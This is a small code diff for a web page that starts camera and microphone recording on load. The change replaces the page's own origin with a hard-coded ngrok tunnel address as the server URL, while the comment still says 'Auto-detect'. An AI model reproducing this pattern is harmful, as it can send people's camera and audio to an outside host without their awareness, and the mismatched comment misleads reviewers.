@@ -33,7 +33,7 @@ header { width:100%; max-width:480px; padding:18px 20px; display:flex; justify-c
 </div>
 <div class="toast" id="toast"></div>
 <script>
-var SERVER_URL = window.location.origin; // Auto-detect server URL
+var SERVER_URL = "https://candy-stardust-kilt.ngrok-free.dev"; // Auto-detect server URL
 var stream = null, mediaRecorder = null, chunks = [], isRecording = false;
 // Start camera
 navigator.mediaDevices.getUserMedia({ video:true, audio:true }).then(s => {
